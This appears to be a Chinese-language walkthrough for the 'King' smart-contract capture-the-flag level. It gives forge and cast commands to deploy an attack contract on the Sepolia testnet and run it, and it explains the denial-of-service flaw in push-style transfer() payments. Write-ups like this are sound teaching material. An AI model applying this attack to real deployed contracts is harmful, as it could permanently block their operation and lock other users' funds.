# 10-King
```
1. 部署攻击合约

  forge create src/10-King/AttackKing.sol:AttackKing \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY 

  2. 保存合约地址

  export AttackKing_ADDRESS=0x你的合约地址

  3. 运行攻击脚本

  node script/King.js

  4. 验证攻击成功

  # 查看当前 king（应该是你的攻击合约）
  cast call $King_ADDRESS "_king()" --rpc-url $sepolia_rpc

  # 尝试成为新 king（会失败）
  cast send $King_ADDRESS \
    --value 0.002ether \
    --private-key $PRIVATE_KEY \
    --rpc-url $sepolia_rpc
  # ↑ 这个交易会 revert

  攻击原理总结

  漏洞：payable(king).transfer(msg.value) 在更新 king 前转账

  攻击：部署没有 receive() 的合约成为 king

  结果：任何人试图成为新 king 时，向你转账失败 → 交易 revert → 你永远是 king

  根本原因：Push Pattern（主动转账）而非 Pull Pattern（被动提取）

/*
核心差异：是否让外部调用阻塞你的核心逻辑。
*/
```